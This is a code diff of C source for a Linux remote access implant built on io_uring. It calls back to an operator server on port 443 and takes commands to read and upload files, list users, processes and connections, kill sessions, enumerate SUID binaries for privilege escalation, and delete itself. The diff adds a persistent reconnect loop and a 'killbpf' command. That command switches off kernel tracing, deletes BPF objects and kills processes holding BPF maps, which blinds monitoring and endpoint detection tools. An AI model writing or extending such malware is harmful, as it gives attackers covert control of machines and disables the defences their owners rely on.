@@ -14,10 +14,11 @@
 #include <errno.h>
 #include <ctype.h>
 
-#define SERVER_IP "192.168.200.132" //CHANGE THIS
+#define SERVER_IP "127.0.0.1" //CHANGE THIS BRO
 #define SERVER_PORT 443 // RECOMMENDEED PORT 443
 #define QUEUE_DEPTH 16
 #define BUF_SIZE 65536
+#define RECONNECT_TIME 5
 
 int send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) {
     size_t sent = 0;
@@ -255,23 +256,6 @@ void cmd_recv(struct io_uring *ring, int sockfd, const char *args) {
     }
 
     close(fd);
-}
-
-void cmd_help(struct io_uring *ring, int sockfd) {
-    const char *msg =
-        "Available commands:\n"
-        "  get <path>                   - See file\n"
-        "  put <local_path> <remote_path> - Upload file\n"
-        "  users                       - View logged users\n"
-        "  ss/netstat                  - View connections\n"
-        "  ps                          - List processes\n"
-        "  me                          - Show agent PID and TTY\n"
-        "  kick <pts>                  - Kill session by pts\n"
-        "  privesc                     - Enumerate SUID binaries\n"
-        "  selfdestruct                - Delete agent and exit\n"
-        "  exit                        - Close connection (without deleting the agent)\n"
-        "  help                        - This help\n";
-    send_all(ring, sockfd, msg, strlen(msg));
 }
 
 /*
@@ -522,6 +506,130 @@ void cmd_exit(struct io_uring *ring, int sockfd) {
     _exit(0);
 }
 
+/*
+This cmd_killbpf version maximizes io_uring usage:
+
+- All open/close operations are now async (openat/close via io_uring)
+- Writes and unlinkat are async
+- Directory iteration (opendir/readdir) and kill() remain traditional calls,
+  since io_uring does not support directory enumeration or signal delivery yet.
+*/
+
+void cmd_killbpf(struct io_uring *ring, int sockfd) {
+    char out[8192];
+    size_t out_pos = 0;
+    int killed_count = 0;
+
+    const char *tracing_disable_files[] = {
+        "/sys/kernel/debug/tracing/tracing_on",
+        "/sys/kernel/debug/tracing/set_event",
+        "/sys/kernel/debug/tracing/current_tracer"
+    };
+
+    for (int i = 0; i < sizeof(tracing_disable_files)/sizeof(tracing_disable_files[0]); i++) {
+        const char *path = tracing_disable_files[i];
+
+        struct io_uring_sqe *sqe;
+        struct io_uring_cqe *cqe;
+        int fd;
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_openat(sqe, AT_FDCWD, path, O_WRONLY, 0);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        fd = cqe->res;
+        io_uring_cqe_seen(ring, cqe);
+
+        if (fd < 0) continue;
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_write(sqe, fd, "0", 1, 0);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        io_uring_cqe_seen(ring, cqe);
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_close(sqe, fd);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        io_uring_cqe_seen(ring, cqe);
+
+        out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                            "[*] Tracing disabled: %s\n", path);
+    }
+
+    DIR *bpf_dir = opendir("/sys/fs/bpf");
+    if (bpf_dir) {
+        struct dirent *entry;
+        while ((entry = readdir(bpf_dir))) {
+            if (entry->d_name[0] == '.') continue;
+
+            char fullpath[512];
+            snprintf(fullpath, sizeof(fullpath), "/sys/fs/bpf/%s", entry->d_name);
+
+            struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
+            struct io_uring_cqe *cqe;
+
+            io_uring_prep_unlinkat(sqe, AT_FDCWD, fullpath, 0);
+            io_uring_submit(ring);
+            io_uring_wait_cqe(ring, &cqe);
+
+            if (cqe->res == 0) {
+                out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                    "[+] Deleted BPF file: %s\n", fullpath);
+            }
+            io_uring_cqe_seen(ring, cqe);
+        }
+        closedir(bpf_dir);
+    }
+
+    DIR *proc = opendir("/proc");
+    if (!proc) {
+        out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                            "[-] Failed to open /proc: %s\n", strerror(errno));
+        send_all(ring, sockfd, out, out_pos);
+        return;
+    }
+
+    struct dirent *entry;
+    while ((entry = readdir(proc))) {
+        if (!isdigit(entry->d_name[0])) continue;
+
+        char map_path[256];
+        snprintf(map_path, sizeof(map_path), "/proc/%s/maps", entry->d_name);
+
+        char map_buf[16384];
+        int ret = read_file_uring(ring, map_path, map_buf, sizeof(map_buf));
+        if (ret <= 0) continue;
+
+        if (strstr(map_buf, "anon_inode:bpf-map")) {
+            pid_t pid = atoi(entry->d_name);
+            if (pid > 1) {
+                if (kill(pid, SIGKILL) == 0) {
+                    killed_count++;
+                    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                        "[+] Killed PID using BPF: %d\n", pid);
+                } else {
+                    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                        "[-] Failed to kill PID %d: %s\n",
+                                        pid, strerror(errno));
+                }
+            }
+        }
+
+        if (out_pos > sizeof(out) - 256)
+            break;
+    }
+    closedir(proc);
+
+    if (killed_count == 0 && out_pos == 0) {
+        out_pos = snprintf(out, sizeof(out),
+                           "[*] No processes with BPF map found\n");
+    }
+
+    send_all(ring, sockfd, out, out_pos);
+}
+
 void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     sanitize_cmd(cmd);
 
@@ -533,32 +641,32 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
         trim_leading(&remote_path);
         cmd_recv(ring, sockfd, remote_path);
 
-    } else if (strcmp(cmd, "users") == 0) {
+    } else if (strncmp(cmd, "users", 5) == 0) {
         cmd_users(ring, sockfd);
 
-    } else if (strcmp(cmd, "ss") == 0 || strcmp(cmd, "netstat") == 0) {
+    } else if (strncmp(cmd, "ss", 2) == 0 || strcmp(cmd, "netstat") == 0) {
         cmd_ss(ring, sockfd);
 
-    } else if (strcmp(cmd, "ps") == 0) {
+    } else if (strncmp(cmd, "ps", 2) == 0) {
         cmd_ps(ring, sockfd);
 
-    } else if (strcmp(cmd, "me") == 0) {
+    } else if (strncmp(cmd, "me", 2) == 0) {
         cmd_me(ring, sockfd);
 
     } else if (strncmp(cmd, "kick", 4) == 0) {
         cmd_kick(ring, sockfd, cmd + 4);
 
-    } else if (strcmp(cmd, "privesc") == 0) {
+    } else if (strncmp(cmd, "privesc", 7) == 0) {
         cmd_privesc(ring, sockfd);
 
-    } else if (strcmp(cmd, "selfdestruct") == 0) {
+    } else if (strncmp(cmd, "selfdestruct", 12) == 0) {
         cmd_selfdestruct(ring, sockfd);
 
-    } else if (strcmp(cmd, "exit") == 0) {
-        cmd_exit(ring, sockfd);
+    } else if (strncmp(cmd, "killbpf", 7) == 0) {
+        cmd_killbpf(ring, sockfd);
 
-    } else if (strcmp(cmd, "help") == 0) {
-        cmd_help(ring, sockfd);
+    } else if (strncmp(cmd, "exit", 4) == 0) {
+        cmd_exit(ring, sockfd);
 
     } else {
         send_all(ring, sockfd, "[*] 404 Command not found [*]\n", 29);
@@ -566,24 +674,19 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
 }
 
 
-int main() {
+
+int main(void)
+{
     struct io_uring ring;
     struct sockaddr_in addr;
     struct io_uring_sqe *sqe;
     struct io_uring_cqe *cqe;
-    int sockfd;
+    int sockfd = -1;
     int ret;
 
     if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
         perror("io_uring_queue_init");
-        exit(1);
-    }
-
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) {
-        perror("socket");
-        io_uring_queue_exit(&ring);
-        exit(1);
+        exit(EXIT_FAILURE);
     }
 
     memset(&addr, 0, sizeof(addr));
@@ -591,18 +694,37 @@ int main() {
     addr.sin_port = htons(SERVER_PORT);
     inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
 
-    sqe = io_uring_get_sqe(&ring);
-    io_uring_prep_connect(sqe, sockfd, (struct sockaddr *)&addr, sizeof(addr));
-    io_uring_submit(&ring);
+    for (;;) {
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockfd < 0) {
+            perror("socket");
+            io_uring_queue_exit(&ring);
+            exit(EXIT_FAILURE);
+        }
 
-    ret = io_uring_wait_cqe(&ring, &cqe);
-    if (ret < 0 || cqe->res < 0) {
-        fprintf(stderr, "connect() failed: %s\n", ret < 0 ? strerror(-ret) : strerror(-cqe->res));
+        sqe = io_uring_get_sqe(&ring);
+        io_uring_prep_connect(sqe, sockfd, (struct sockaddr *) &addr, sizeof(addr));
+        io_uring_submit(&ring);
+
+        ret = io_uring_wait_cqe(&ring, &cqe);
+        if (ret < 0) {
+            fprintf(stderr, "io_uring_wait_cqe: %s\n", strerror(-ret));
+            io_uring_cqe_seen(&ring, cqe);
+            close(sockfd);
+            sleep(RECONNECT_TIME);
+            continue;
+        }
+
+        if (cqe->res == 0) {
+            io_uring_cqe_seen(&ring, cqe);
+            break;
+        }
+
+        fprintf(stderr, "connect() failed: trying to reconnect\n");
         io_uring_cqe_seen(&ring, cqe);
-        io_uring_queue_exit(&ring);
-        exit(1);
+        close(sockfd);
+        sleep(RECONNECT_TIME);
     }
-    io_uring_cqe_seen(&ring, cqe);
 
     printf("[+] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);
 
@@ -632,6 +754,7 @@ int main() {
         process_cmd(&ring, sockfd, buf);
     }
 
+
     sqe = io_uring_get_sqe(&ring);
     io_uring_prep_close(sqe, sockfd);
     io_uring_submit(&ring);
@@ -640,6 +763,5 @@ int main() {
 
     io_uring_queue_exit(&ring);
     printf("[+] Connection closed\n");
-
     return 0;
 }
